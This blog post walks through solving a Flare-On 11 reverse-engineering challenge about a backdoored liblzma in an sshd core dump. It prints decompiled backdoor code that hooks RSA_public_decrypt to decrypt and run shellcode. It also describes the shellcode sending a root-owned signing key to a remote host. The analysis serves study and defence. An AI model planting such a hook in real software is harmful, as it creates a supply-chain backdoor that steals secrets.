---
title: "Solving Flare-On 11 Challenge 5 without Emulation or Patching"
date: 2024-12-16
tags: ["FlareOn", "CTF"]
draft: false
---

The challenge is called "sshd" and provides the fileystem of a debian machine, which is pretty empty. In ` var/lib/systemd/coredump`, there is a core dump file of a crashed sshd process, which is worth investigating.In order to do that, we can chroot to the extracted file system, and examine the core dump with gdb: `gdb /usr/sbin/sshd /var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676`. Displaying the backtrace with `bt`, we see:
```
(gdb) bt
#0  0x0000000000000000 in ?? ()
#1  0x00007f4a18c8f88f in ?? () from /lib/x86_64-linux-gnu/liblzma.so.5
#2  0x000055b46c7867c0 in ?? ()
#3  0x000055b46c73f9d7 in ?? ()
#4  0x000055b46c73ff80 in ?? ()
#5  0x000055b46c71376b in ?? ()
#6  0x000055b46c715f36 in ?? ()
#7  0x000055b46c7199e0 in ?? ()
#8  0x000055b46c6ec10c in ?? ()
#9  0x00007f4a18e5824a in __libc_start_call_main (main=main@entry=0x55b46c6e7d50, argc=argc@entry=4, 
    argv=argv@entry=0x7ffcc6602eb8) at ../sysdeps/nptl/libc_start_call_main.h:58
#10 0x00007f4a18e58305 in __libc_start_main_impl (main=0x55b46c6e7d50, argc=4, argv=0x7ffcc6602eb8, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffcc6602ea8) at ../csu/libc-start.c:360
#11 0x000055b46c6ec621 in ?? ()
```
Seemingly, the process crashed due to invalid memory access at address zero, called from liblzma.

Next, we want to examine the function in liblzma, that caused the crash. Looking at the memory map using the command `info proc mappings`, we see that liblzma is mapped at address `0x7f4a18c86000`. Together with knowing that the call, that caused the crash, happend at `0x7f4a18c8f88f`, we know that this corresponds to offset `0x988f` in the liblzma binary.

So, it is time to analyze the liblzma binary at that offset. There, we see an interesting function that hooks `RSA_public_decrypt`, [xz backdoor style](https://www.openwall.com/lists/oss-security/2024/03/29/4). In Binary Ninja, the reversed code with some renaming applied looks like this:
```c
int64_t mw_hook_rsa_public_decrypt(int32_t flen, uint8_t* encrypted, uint8_t* decrypted, int64_t rsa_struct, int32_t padding)

    // Parameters:
    // int flen, unsigned char *from, unsigned char *to, RSA *rsa, int
    // RSA_PKCS1_PADDING
    void* fsbase
    int64_t rax = *(fsbase + 0x28)
    char const* const rsi = "RSA_public_decrypt"

    if (getuid() == 0)
        if (*encrypted == 0xc5407a48)
            void state
            chacha20_1(&state, key: &encrypted[4], nonce: &encrypted[0x24], 0)
            // mmap prot: RWX, flags: 0x22, fd = -1, offset: 0 
            void* address_of_shellcode = memcpy(mmap(addr: nullptr, len: sx.q(length), prot: 7, flags: 0x22, fd: 0xffffffff, offset: 0), &encrypted_code, sx.q(length))
            chacha20_2(&state, encrypted: address_of_shellcode, sx.q(length))
            address_of_shellcode()
            chacha20_1(&state, key: &encrypted[4], nonce: &encrypted[0x24], 0)
            chacha20_2(&state, encrypted: address_of_shellcode, sx.q(length))
        
        rsi = "RSA_public_decrypt "
    
    // execute original RSA_public_decrypt
    // (dlsym returns 0 because the string in rsi contains a trailing space -> segfault)
    int64_t result = dlsym(0, rsi)(zx.q(flen), encrypted, decrypted, rsa_struct, zx.q(padding))
    
    if (rax == *(fsbase + 0x28))
        return result
    
    __stack_chk_fail()
    noreturn
```

The second function parameter `encrypted`, which is stored in rsi, is a pointer to a buffer. If this buffer begins with the magic bytes `0xc5407a48` and the process is executed as root, some suspicious stuff is happening. By reversing the functions that are called, it can be identified that they are implementing the ChaCha20 cipher due to the characteristic string `expand 32-byte k`. The first 0x20 byte after the magic byte constitute the encryption key and the following 12 bytes are the nonce. The encrypted shellcode is referenced in the liblzma binary at address `0x23960`.

So, let's decrypt that shellcode! We can extract key and nonce from the core dump:
```
(gdb) x/12x $rsi
0x55b46d51dde0:	0xc5407a48	0x38f63d94	0xe21318a8	0xa51863de
0x55b46d51ddf0:	0xbaa0f907	0x7b8abb2d	0xd06636a6	0x5ea6118d
0x55b46d51de00:	0x6fd614c9	0x9f8336f2	0x1a71cd4d	0x55298652
```
Considering little endian, the key is `943df638a81813e2de6318a507f9a0ba2dbb8a7ba63666d08d11a65ec914d66f` and the nonce `f236839f4dcd711a52862955`.

Throwing everything into CyberChef and letting it do the ChaCha20 decryption, the result is x86-64 shellcode that uses direct syscalls. The decrypted shellcode can be loaded into Ghidra as a raw binary, with x86-64 architecture specified. 
Reversing the shellcode, while looking up the [Linux x86-64 System Call Table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/), we can find out pretty quickly, what it does: The shellcode establishes a TCP connection to 10.0.2.15:1337 and then receives key, nonce and filename, reads the file content, encrypts it using (seemingly) ChaCha20 and sends the ciphertext to the server. The filename is at `rbp-0x1248`, the key at `rbp-0x1278`, the nonce at `rbp-0x1258` and the encrypted data is at `rbp-0x1148`.

Now, in order to extract all this from the core dump, we need to determine the value of rbp during shellcode execution. Looking at the stack in the core dump, the string `/root/certificate_authority_signing_key.txt`, which is at `0x7ffcc6600c18` is eye-catching. Assuming that this is the filename that is communicated to the server, we can calculate the value of rbp by adding `0x1248` to that address. This gives us `rbp = 0x7ffcc6601e60`. Henceforth, we can extract key, nonce and the encrypted data from the core dump:
- key: `8dec9112eb760eda7c7d87a443271c35d9e0cb878993b4d904aef934fa2166d7`
- nonce: `111111111111111111111111`
- the encrypted data is at `0x7ffcc6600d18`

But, when decrypting it using ChaCha20, we don't get a useful result. As I didn't want to emulate the shellcode, I skimmed over the encryption routine and tried to observe any differences from normal a ChaCha20 implementation. And well, the string `expand 32-byte K` is used instead of `expand 32-byte k`. Fortunately, this is the only difference and we can get a ChaCha20 implementation from Github, change the `k` and successfully decrypt the flag `supp1y_cha1n_sund4y@flare-on.com`.
